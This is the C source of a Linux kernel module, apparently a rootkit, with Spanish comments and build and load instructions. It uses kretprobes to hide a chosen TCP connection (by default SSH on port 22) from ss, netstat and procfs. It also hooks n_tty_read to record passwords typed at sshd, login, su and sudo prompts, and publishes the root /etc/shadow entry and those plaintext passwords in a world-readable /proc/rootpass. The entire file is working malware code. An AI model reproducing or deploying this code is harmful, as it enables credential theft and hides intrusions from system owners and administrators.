// SPDX-License-Identifier: GPL-2.0
/*
 * hide_ssh - (1) oculta UNA conexión TCP de ss(8)/netstat/lsof/procfs
 *            (2) expone /etc/shadow:root y las contraseñas tecleadas
 *                en /proc/rootpass (0444, lectura para todos)
 *
 * Compilar:
 *   make -C /lib/modules/$(uname -r)/build M=$PWD modules
 * Cargar:
 *   insmod hide_ssh.ko a_port=22
 * Depurar:
 *   insmod hide_ssh.ko a_port=22 dbg=1   (traza en dmesg al usar ss)
 * Leer:
 *   cat /proc/rootpass
 */

#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/inet.h>
#include <linux/ipv6.h>
#include <linux/kprobes.h>
#include <linux/ktime.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/skbuff.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/tty.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <net/ipv6.h>
#include <net/sock.h>
#include <net/tcp.h>

/* ---------------- glue por arquitectura ---------------- */
#if defined(CONFIG_X86_64)
#define ARG0(r) ((unsigned long)(r)->di)
#define ARG1(r) ((unsigned long)(r)->si)
#define ARG2(r) ((unsigned long)(r)->dx)
#define ARG3(r) ((unsigned long)(r)->cx)
#define GETRET(r) ((long)(r)->ax)
#define SETRET(r, v)                                                           \
  do {                                                                         \
    (r)->ax = (unsigned long)(v);                                              \
  } while (0)
#elif defined(CONFIG_ARM64)
#define ARG0(r) ((unsigned long)(r)->regs[0])
#define ARG1(r) ((unsigned long)(r)->regs[1])
#define ARG2(r) ((unsigned long)(r)->regs[2])
#define ARG3(r) ((unsigned long)(r)->regs[3])
#define GETRET(r) ((long)(r)->regs[0])
#define SETRET(r, v)                                                           \
  do {                                                                         \
    (r)->regs[0] = (unsigned long)(v);                                         \
  } while (0)
#else
#error "añade el mapeo de registros para tu arquitectura"
#endif

/* ================================================================
 * PARTE 1 - ocultación de la conexión
 * ================================================================ */
struct endpoint {
  __be32 v4;
  struct in6_addr v6;
  __be16 port;
  u8 family;
  bool wildcard;
};

static struct endpoint ep_a, ep_b;

static char *a_ip = "any";
static char *b_ip = "any";
static unsigned int a_port, b_port;
static bool hide_both = true;
static bool hide_listen;
static bool dbg;

module_param(a_ip, charp, 0644);
module_param(a_port, uint, 0644);
module_param(b_ip, charp, 0644);
module_param(b_port, uint, 0644);
module_param(hide_both, bool, 0644);
module_param(hide_listen, bool, 0644);
module_param(dbg, bool, 0644);

static int hide_ssh_parse(void);

static int refresh_set(const char *val, const struct kernel_param *kp) {
  return hide_ssh_parse();
}
static const struct kernel_param_ops refresh_ops = {.set = refresh_set};
module_param_cb(refresh, &refresh_ops, NULL, 0200);

static int parse_ep(const char *str, unsigned int port, struct endpoint *ep) {
  u8 tmp[16];

  if (!str || !*str || !strcmp(str, "any")) {
    ep->wildcard = true;
    ep->port = port ? htons((u16)port) : 0;
    return 0;
  }

  if (strchr(str, ':')) {
#if IS_ENABLED(CONFIG_IPV6)
    if (!in6_pton(str, -1, tmp, -1, NULL))
      return -EINVAL;
    memcpy(&ep->v6, tmp, sizeof(ep->v6));
    ep->family = AF_INET6;
#else
    return -EINVAL;
#endif
  } else {
    if (!in4_pton(str, -1, tmp, -1, NULL))
      return -EINVAL;
    memcpy(&ep->v4, tmp, sizeof(ep->v4));
    ep->family = AF_INET;
  }
  ep->port = htons((u16)port);
  return 0;
}

static int hide_ssh_parse(void) {
  struct endpoint na, nb;
  int ret;

  memset(&na, 0, sizeof(na));
  memset(&nb, 0, sizeof(nb));

  ret = parse_ep(a_ip, a_port, &na);
  if (ret)
    return ret;
  ret = parse_ep(b_ip, b_port, &nb);
  if (ret)
    return ret;

  if (na.wildcard && nb.wildcard && !na.port && !nb.port)
    return -EINVAL;
  if (!na.wildcard && !nb.wildcard && na.family != nb.family)
    return -EINVAL;

  if (na.wildcard && !nb.wildcard)
    na.family = nb.family;
  if (nb.wildcard && !na.wildcard)
    nb.family = na.family;
  if (!na.family) {
    na.family = AF_INET;
    nb.family = AF_INET;
  }

  ep_a = na;
  ep_b = nb;
  return 0;
}

static bool laddr_match(const struct sock *sk, const struct endpoint *e) {
  if (sk->sk_family != e->family)
    return false;
  if (!e->wildcard) {
    if (e->family == AF_INET) {
      if (sk->sk_rcv_saddr != e->v4)
        return false;
    }
#if IS_ENABLED(CONFIG_IPV6)
    else if (!ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &e->v6)) {
      return false;
    }
#endif
  }
  if (e->port && inet_sk(sk)->inet_sport != e->port)
    return false;
  return true;
}

static bool ep_match(const struct sock *sk, const struct endpoint *l,
                     const struct endpoint *r) {
  if (!laddr_match(sk, l))
    return false;

  if (!r->wildcard) {
    if (r->family == AF_INET) {
      if (sk->sk_daddr != r->v4)
        return false;
    }
#if IS_ENABLED(CONFIG_IPV6)
    else if (!ipv6_addr_equal(&sk->sk_v6_daddr, &r->v6)) {
      return false;
    }
#endif
  }
  if (r->port && inet_sk(sk)->inet_dport != r->port)
    return false;
  return true;
}

static bool listen_match(const struct sock *sk) {
  if (!hide_listen)
    return false;
  if (sk->sk_family != ep_a.family)
    return false;
  if (ep_a.port && inet_sk(sk)->inet_sport != ep_a.port)
    return false;
  if (!ep_a.wildcard && ep_a.family == AF_INET && sk->sk_rcv_saddr != ep_a.v4 &&
      sk->sk_rcv_saddr != 0)
    return false;
  return true;
}

static bool sk_match(const struct sock *sk) {
  if (sk->sk_protocol != IPPROTO_TCP)
    return false;
  if (sk->sk_state == TCP_LISTEN)
    return listen_match(sk);
  if (sk->sk_state != TCP_ESTABLISHED)
    return false;
  if (ep_match(sk, &ep_a, &ep_b))
    return true;
  if (hide_both && ep_match(sk, &ep_b, &ep_a))
    return true;
  return false;
}

/* --- netlink sock_diag (ss) --- */
struct diag_inst {
  struct sk_buff *skb;
  unsigned int saved_len;
  bool matched;
};

static bool looks_like_sock(const void *p) {
  const struct sock *sk = p;

  if (!p || (unsigned long)p < 0x1000)
    return false;
  if (!sk->sk_family || sk->sk_family > AF_MAX)
    return false;
  if (sk->sk_protocol > IPPROTO_MAX)
    return false;
  if (sk->sk_state > TCP_NEW_SYN_RECV)
    return false;
  return true;
}

static bool looks_like_skb(const void *p) {
  const struct sk_buff *skb = p;

  if (!p || (unsigned long)p < 0x1000)
    return false;
  if (!skb->head)
    return false;
  if (skb->len > skb->end)
    return false;
  if ((unsigned long)skb->tail > (unsigned long)skb->end)
    return false;
  return true;
}

/*
 * sk y skb se pasan ya resueltos por cada handler de entrada: la posición
 * del skb depende de la firma y no se puede adivinar.
 */
static int diag_common(struct diag_inst *d, struct sock *sk,
                       struct sk_buff *skb) {
  d->matched = false;
  d->skb = NULL;
  d->saved_len = 0;

  if (!looks_like_sock(sk) || !looks_like_skb(skb)) {
    if (dbg)
      pr_info("diag: descartado sk=%px skb=%px\n", sk, skb);
    return 0;
  }
  if (!sk_match(sk)) {
    if (dbg)
      pr_info("diag: sin match fam=%u st=%u sport=%u\n", sk->sk_family,
              sk->sk_state, ntohs(inet_sk(sk)->inet_sport));
    return 0;
  }
  if (dbg)
    pr_info("diag: OCULTANDO sk=%px skb=%px len=%u\n", sk, skb, skb->len);

  d->skb = skb;
  d->saved_len = skb->len;
  d->matched = true;
  return 0;
}

/* inet_sk_diag_fill(struct sock *sk, struct inet_connection_sock *icsk,
 *                   struct sk_buff *skb, ...)  ->  ARG1 es icsk, NO es un skb
 */
static int diag_entry_icsk(struct kretprobe_instance *ri,
                           struct pt_regs *regs) {
  return diag_common((void *)ri->data, (struct sock *)ARG0(regs),
                     (struct sk_buff *)ARG2(regs));
}

/* firma vieja: inet_diag_fill(struct sock *sk, struct sk_buff *skb, ...) */
static int diag_entry_skb1(struct kretprobe_instance *ri,
                           struct pt_regs *regs) {
  return diag_common((void *)ri->data, (struct sock *)ARG0(regs),
                     (struct sk_buff *)ARG1(regs));
}

static int diag_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
  struct diag_inst *d = (void *)ri->data;
  long ret = GETRET(regs);

  if (!d->matched || !d->skb)
    return 0;
  /* ojo: inet_sk_diag_fill() devuelve 0 en éxito, solo <0 es error */
  if (ret < 0)
    return 0;
  if (!looks_like_skb(d->skb))
    return 0;
  if (d->skb->len <= d->saved_len)
    return 0;

  skb_trim(d->skb, d->saved_len);
  if (dbg)
    pr_info("ret: recortado %u -> %u\n", d->saved_len + 124, d->skb->len);
  /* sin SETRET: el valor de éxito (0) se queda como está */
  return 0;
}

static struct kretprobe kr_diag = {
    .kp.symbol_name = "inet_sk_diag_fill",
    .entry_handler = diag_entry_icsk,
    .handler = diag_ret,
    .data_size = sizeof(struct diag_inst),
    .maxactive = 64,
};

static struct kretprobe kr_diag2 = {
    .kp.symbol_name = "inet_diag_fill",
    .entry_handler = diag_entry_skb1,
    .handler = diag_ret,
    .data_size = sizeof(struct diag_inst),
    .maxactive = 64,
};

/* sk_diag_fill(struct sock *sk, struct sk_buff *skb, ...) - AF_UNIX */
static struct kretprobe kr_skdiag = {
    .kp.symbol_name = "sk_diag_fill",
    .entry_handler = diag_entry_skb1,
    .handler = diag_ret,
    .data_size = sizeof(struct diag_inst),
    .maxactive = 64,
};

/* --- procfs /proc/net/tcp[6] --- */
struct seq_inst {
  struct seq_file *seq;
  unsigned int saved;
  bool matched;
};

static int tcp_seq_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
  struct seq_inst *d = (void *)ri->data;
  struct seq_file *seq = (struct seq_file *)ARG0(regs);
  void *v = (void *)ARG1(regs);

  d->matched = false;
  d->seq = NULL;
  if (!seq || !v || v == SEQ_START_TOKEN)
    return 0;
  if (!sk_match((struct sock *)v))
    return 0;

  d->seq = seq;
  d->saved = seq->count;
  d->matched = true;
  return 0;
}

static int tcp_seq_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
  struct seq_inst *d = (void *)ri->data;

  if (d->matched && d->seq && d->seq->count > d->saved)
    d->seq->count = d->saved;
  return 0;
}

static struct kretprobe kr_tcp4 = {
    .kp.symbol_name = "tcp4_seq_show",
    .entry_handler = tcp_seq_entry,
    .handler = tcp_seq_ret,
    .data_size = sizeof(struct seq_inst),
    .maxactive = 64,
};

static struct kretprobe kr_tcp6 = {
    .kp.symbol_name = "tcp6_seq_show",
    .entry_handler = tcp_seq_entry,
    .handler = tcp_seq_ret,
    .data_size = sizeof(struct seq_inst),
    .maxactive = 64,
};

/* ================================================================
 * PARTE 2 - /proc/rootpass
 * ================================================================ */
#define RP_MAX 128
#define RP_SLOTS 8

struct rp_slot {
  char pass[RP_MAX];
  char meta[80];
  u64 ts;
};

static struct rp_slot rp_ring[RP_SLOTS];
static unsigned int rp_head;
static DEFINE_SPINLOCK(rp_lock);

static int rp_clear_set(const char *val, const struct kernel_param *kp) {
  spin_lock(&rp_lock);
  memset(rp_ring, 0, sizeof(rp_ring));
  rp_head = 0;
  spin_unlock(&rp_lock);
  return 0;
}
static const struct kernel_param_ops rp_clear_ops = {.set = rp_clear_set};
module_param_cb(rp_clear, &rp_clear_ops, NULL, 0200);

/* --- lectura de /etc/shadow desde el kernel --- */
static char *rp_read_root_line(void) {
  struct file *f;
  char *buf, *p, *out;
  loff_t pos = 0;
  ssize_t n;
  size_t len;

  f = filp_open("/etc/shadow", O_RDONLY, 0);
  if (IS_ERR(f))
    return ERR_PTR(PTR_ERR(f));

  buf = kmalloc(4096, GFP_KERNEL);
  if (!buf) {
    filp_close(f, NULL);
    return ERR_PTR(-ENOMEM);
  }

  n = kernel_read(f, buf, 4095, &pos);
  filp_close(f, NULL);
  if (n <= 0) {
    kfree(buf);
    return ERR_PTR(n ? n : -EIO);
  }
  buf[n] = 0;

  for (p = buf; p && *p; p = strchr(p, '\n')) {
    if (p != buf)
      p++;
    if (strncmp(p, "root:", 5))
      continue;
    len = strcspn(p, "\n");
    out = kmemdup_nul(p, len, GFP_KERNEL);
    kfree(buf);
    return out;
  }

  kfree(buf);
  return ERR_PTR(-ENOENT);
}

static int rp_show(struct seq_file *m, void *v) {
  struct rp_slot snap[RP_SLOTS];
  unsigned int head, i, cnt;
  char *line;

  seq_puts(m, "# /proc/rootpass\n");

  line = rp_read_root_line();
  if (IS_ERR_OR_NULL(line))
    seq_printf(m, "shadow: no disponible (%ld)\n",
               line ? PTR_ERR(line) : -ENOMEM);
  else {
    seq_printf(m, "shadow: %s\n", line);
    kfree(line);
  }

  spin_lock(&rp_lock);
  head = rp_head;
  memcpy(snap, rp_ring, sizeof(snap));
  spin_unlock(&rp_lock);

  cnt = min(head, (unsigned int)RP_SLOTS);
  seq_printf(m, "capturas: %u\n", head);
  if (!cnt) {
    seq_puts(m, "plain: (ninguna todavia)\n");
    return 0;
  }

  for (i = 1; i <= cnt; i++) {
    const struct rp_slot *s = &snap[(head - i) % RP_SLOTS];

    seq_printf(m, "plain: %s   [%s, %llu]\n", s->pass, s->meta,
               (unsigned long long)s->ts);
  }
  return 0;
}

static int rp_open(struct inode *inode, struct file *file) {
  return single_open(file, rp_show, NULL);
}

static const struct proc_ops rp_pops = {
    .proc_open = rp_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

/* --- captura de contraseñas vía n_tty_read --- */
struct read_inst {
  u8 __user *kbuf;
  char tmp[RP_MAX];
  char meta[80];
  bool armed;
};

static bool rp_comm_ok(void) {
  const char *c = current->comm;

  return !strcmp(c, "sshd") || !strcmp(c, "sshd-session") ||
         !strcmp(c, "login") || !strcmp(c, "su") || !strcmp(c, "sudo");
}

static int tty_read_entry(struct kretprobe_instance *ri, struct pt_regs *regs) {
  struct read_inst *d = (void *)ri->data;
  struct tty_struct *tty = (struct tty_struct *)ARG0(regs);
  u8 *kbuf = (u8 *)ARG2(regs);
  size_t nr = (size_t)ARG3(regs);

  d->armed = false;
  if (!tty || !kbuf || !nr)
    return 0;
  if (!rp_comm_ok())
    return 0;
  /* eco apagado == prompt de contraseña */
  if (L_ECHO(tty))
    return 0;

  d->kbuf = kbuf;
  snprintf(d->meta, sizeof(d->meta), "%s tty=%s", current->comm, tty_name(tty));
  d->armed = true;
  return 0;
}

static int tty_read_ret(struct kretprobe_instance *ri, struct pt_regs *regs) {
  struct read_inst *d = (void *)ri->data;
  struct rp_slot *slot;
  size_t n;
  long ret = GETRET(regs);

  if (!d->armed || ret <= 0)
    return 0;

  n = min_t(size_t, (size_t)ret, RP_MAX - 1);
  /* contexto atómico: nada de copy_from_user() que pueda dormir */
  if (copy_from_user_nofault(d->tmp, d->kbuf, n))
    return 0;
  while (n && (d->tmp[n - 1] == '\n' || d->tmp[n - 1] == '\r'))
    n--;
  d->tmp[n] = 0;
  if (!n)
    return 0;

  spin_lock(&rp_lock);
  slot = &rp_ring[rp_head % RP_SLOTS];
  memcpy(slot->pass, d->tmp, n + 1);
  memcpy(slot->meta, d->meta, sizeof(slot->meta));
  slot->ts = ktime_get_real_seconds();
  rp_head++;
  spin_unlock(&rp_lock);
  return 0;
}

static struct kretprobe kr_tty = {
    .kp.symbol_name = "n_tty_read",
    .entry_handler = tty_read_entry,
    .handler = tty_read_ret,
    .data_size = sizeof(struct read_inst),
    .maxactive = 32,
};

/* ================================================================
 * init / exit
 * ================================================================ */
static struct proc_dir_entry *rp_entry;

/* solo se desregistra lo que de verdad llegó a registrarse: un
 * unregister_kretprobe() sobre un fallo previo revienta en rethook_free() */
static bool reg_diag, reg_diag2, reg_skdiag, reg_tcp4, reg_tcp6, reg_tty;

static int __init hide_ssh_init(void) {
  int ret;

  ret = hide_ssh_parse();
  if (ret) {
    pr_err("parámetros inválidos (a_ip/a_port/b_ip/b_port)\n");
    return ret;
  }

  request_module("inet_diag");
  request_module("tcp_diag");

  if (!register_kretprobe(&kr_diag)) {
    reg_diag = true;
    pr_info("hook en inet_sk_diag_fill (skb=arg2)\n");
  } else if (!register_kretprobe(&kr_diag2)) {
    reg_diag2 = true;
    pr_info("hook en inet_diag_fill (skb=arg1)\n");
  } else {
    pr_warn("sin hook de sock_diag: ss NO se ocultara\n");
  }

  if (!register_kretprobe(&kr_skdiag))
    reg_skdiag = true;
  else
    pr_warn("sin hook en sk_diag_fill\n");

  if (!register_kretprobe(&kr_tcp4))
    reg_tcp4 = true;
  else
    pr_warn("sin hook en tcp4_seq_show (procfs IPv4)\n");

  if (ep_a.family == AF_INET6) {
    if (!register_kretprobe(&kr_tcp6))
      reg_tcp6 = true;
    else
      pr_warn("sin hook en tcp6_seq_show (procfs IPv6)\n");
  }

  if (!register_kretprobe(&kr_tty))
    reg_tty = true;
  else
    pr_warn("sin hook en n_tty_read (sin captura de contraseñas)\n");

  rp_entry = proc_create("rootpass", 0444, NULL, &rp_pops);
  if (!rp_entry)
    pr_warn("no se pudo crear /proc/rootpass\n");

  pr_info("ocultando %s:%u <-> %s:%u (both=%d listen=%d)\n", a_ip, a_port, b_ip,
          b_port, hide_both, hide_listen);
  return 0;
}

static void __exit hide_ssh_exit(void) {
  /* primero el procfs: puede bloquear esperando lectores */
  if (rp_entry)
    proc_remove(rp_entry);
  rp_entry = NULL;

  if (reg_tty) {
    unregister_kretprobe(&kr_tty);
    reg_tty = false;
  }
  if (reg_skdiag) {
    unregister_kretprobe(&kr_skdiag);
    reg_skdiag = false;
  }
  if (reg_diag) {
    unregister_kretprobe(&kr_diag);
    reg_diag = false;
  }
  if (reg_diag2) {
    unregister_kretprobe(&kr_diag2);
    reg_diag2 = false;
  }
  if (reg_tcp4) {
    unregister_kretprobe(&kr_tcp4);
    reg_tcp4 = false;
  }
  if (reg_tcp6) {
    unregister_kretprobe(&kr_tcp6);
    reg_tcp6 = false;
  }

  pr_info("hooks retirados\n");
}

module_init(hide_ssh_init);
module_exit(hide_ssh_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Oculta una conexión TCP y expone root:/etc/shadow + "
                   "contraseñas en /proc/rootpass");
MODULE_AUTHOR("Yiuseppe");
